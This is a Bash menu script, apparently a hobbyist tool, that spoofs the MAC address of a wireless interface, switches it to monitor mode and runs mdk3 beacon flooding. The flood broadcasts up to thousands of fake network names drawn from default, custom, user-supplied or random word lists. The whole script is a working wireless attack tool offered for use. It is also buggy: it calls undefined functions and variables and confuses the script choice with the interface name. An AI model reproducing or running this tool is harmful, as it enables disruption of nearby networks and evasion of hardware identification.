#!/bin/bash

#  ____          _______                         _     
# |  _ \        |__   __|                       | |    
# | |_) |_   _     | |_ __ ___   ___  _ __   ___| | __ 
# |  _ <| | | |    | | '__/ _ \ / _ \| '_ \ / _ \ |/ / 
# | |_) | |_| |    | | | | (_) | (_) | |_) |  __/   <  
# |____/ \__, |    |_|_|  \___/ \___/| .__/ \___|_|\_\ 
#         __/ |                      | |               
#        |___/                       |_|               
# Github: https://github.com/TroopekYT/



#Terminal Colors
NO_COLOR="\e[0m"

WHITE="\e[0;17m"
BOLD_WHITE="\e[1;37m"

CYAN="\e[0;36m"
BOLD_CYAN="\e[1;36m"

BLUE="\e[0;34m"
BOLD_BLUE="\e[1;34m"

RED="\e[0;31m"
BOLD_RED="\e[1;31m"

#Temporary test function
function testColors() {
clear
echo -e "$NO_COLOR none ★"
echo -e "$WHITE white"
echo -e "$BOLD_WHITE bold white"
echo -e "$CYAN cyan"
echo -e "$BOLD_CYAN bold cyan ★"
echo -e "$BLUE cyan"
echo -e "$BOLD_BLUE bold cyan ★"
echo -e "$RED red"
echo -e "$BOLD_Red bold red"
echo -e "$NO_COLOR -------------------------------"
}


function end() {
clear
echo -e "$BOLD_CYAN ★ $BOLD_BLUE Have a nice day! $BOLD_CYAN★"
echo -e "$BOLD_BLUE My GitHub:$WHITE https://github.com/TroopekYT"
exit
}



function title() {
echo -e "$WHITE ▄▄▄█████▓ ██▀███   ▒█████   ██▓███   $RED  ▒██   ██▒
$WHITE▓  ██▒ ▓▒▓██ ▒ ██▒▒██▒  ██▒▓██░  ██▒  $RED ▒▒ █ █ ▒░
$WHITE▒ ▓██░ ▒░▓██ ░▄█ ▒▒██░  ██▒▓██░ ██▓▒  $RED ░░  █   ░
$WHITE░ ▓██▓ ░ ▒██▀▀█▄  ▒██   ██░▒██▄█▓▒ ▒  $RED  ░ █ █ ▒ 
$WHITE  ▒██▒ ░ ░██▓ ▒██▒░ ████▓▒░▒██▒ ░  ░  $RED ▒██▒ ▒██▒
$WHITE  ▒ ░░   ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ▒▓▒░ ░  ░  $RED ▒▒ ░ ░▓ ░
$WHITE    ░      ░▒ ░ ▒░  ░ ▒ ▒░ ░▒ ░      $RED  ░░   ░▒ ░
$WHITE  ░        ░░   ░ ░ ░ ░ ▒  ░░        $RED   ░    ░  
$WHITE            ░         ░ ░            $RED   ░    ░  "
                                                
                                 
echo -e "$WHITE                                   By$RED Troopek  "
echo " "
}



title
sleep 1
echo -e "$BOLD_GREEN  Available Scripts: "
echo -e -n "$BOLD_WHITE"


echo -e "
(1) ScriptOne
(2) ScriptTwo
"

echo -e " "
echo -n -e "$BOLD_BLUE  Select desired script > "
echo -n -e "$BOLD_WHITE"
read AD
clear
title
echo -e "$BOLD_BLUE  Choose an option:"
echo " "
echo -e "$BOLD_BLUE  1.$BOLD_WHITE Use the default word list (1000 SSIDs)"
echo -e "$BOLD_BLUE  2.$BOLD_WHITE Create a custom word list and use it"
echo -e "$BOLD_BLUE  3.$BOLD_WHITE Use an existent word list"
echo -e "$BOLD_BLUE  4.$BOLD_WHITE Use a random SSIDs word list"
echo " "
echo -n -e "$BOLD_BLUE  > "
echo -n -e "$BOLD_WHITE"
read DD
clear
if [ $DD == 1 ]; then
	nmcli device disconnect $AD > /dev/null 2>&1
	clear
	title
	echo -e "$BOLD_GREEN Starting process..."
	echo " If you want to stop it, press CTRL+C."
	echo " "
	trap coolexit EXIT
	sleep 1
	ifconfig $AD down
	macchanger -r $AD
	iwconfig $AD mode monitor
	ifconfig $AD up
	trap coolexit EXIT
	mdk3 $AD b -f ./SSID_List.txt -a -s 1000
fi
if [ $DD == 2 ]; then
	nmcli device disconnect $AD > /dev/null 2>&1
	clear
	title
	echo -n -e "$BOLD_BLUE Type a string (Max. length: 12) > "
	echo -n -e "$BOLD_WHITE"
	read WORD
	echo -n -e "$BOLD_BLUE How many SSIDs do you want? > "
	echo -n -e "$BOLD_WHITE"
	read N
	COUNT=1
	while [ $COUNT -lt $N ] || [ $COUNT -eq $N ]; do
		echo $WORD $COUNT >> $WORD"_wordlist.txt"
		let COUNT=COUNT+1
	done
	clear
	title
	echo -e "$BOLD_GREEN Starting process..."
	echo " If you want to stop it, press CTRL+C."
	echo " "
	trap coolexit EXIT
	sleep 1
	ifconfig $AD down
	macchanger -r $AD
	iwconfig $AD mode monitor
	ifconfig $AD up
	trap coolexit EXIT
	mdk3 $AD b -f ./$WORD"_wordlist.txt" -a -s 1000
fi
if [ $DD == 3 ]; then
	nmcli device disconnect $AD > /dev/null 2>&1
	clear
	title
	echo -e "$BOLD_WHITE Note: your word list must have the same structure as"
	echo -e " SSID_List.txt, otherwise the process won't work."
	echo " "
	echo -n -e "$BOLD_BLUE Type the name of your own word list > "
	echo -n -e "$BOLD_WHITE"
	read OWN
	clear
	title
	echo -e "$BOLD_GREEN Starting process..."
	echo " If you want to stop it, press CTRL+C."
	echo -e "$BOLD_WHITE"
	sleep 1
	ifconfig $AD down
	macchanger -r $AD
	iwconfig $AD mode monitor
	ifconfig $AD up
	trap coolexit EXIT
	mdk3 $AD b -f ./$OWN -a -s $(wc -l $OWN | cut -f1 -d ' ')
fi
if [ $DD == 4 ]; then
	nmcli device disconnect $AD > /dev/null 2>&1
	clear
	title
	echo -n -e "$BOLD_BLUE How many SSIDs do you want? > "
	echo -n -e "$BOLD_WHITE"
	read N
	COUNT=1
	while [ $COUNT -lt $N ] || [ $COUNT -eq $N ]; do
		echo $(pwgen 14 1) >> "RANDOM_wordlist.txt"
		let COUNT=COUNT+1
	done
	clear
	title
	echo -e "$BOLD_GREEN Starting process..."
	echo " If you want to stop it, press CTRL+C."
	echo " "
	sleep 1
	ifconfig $AD down
	macchanger -r $AD
	iwconfig $AD mode monitor
	ifconfig $AD up
	trap coolexit EXIT
	mdk3 $AD b -f ./RANDOM_wordlist.txt -a -s $N
fi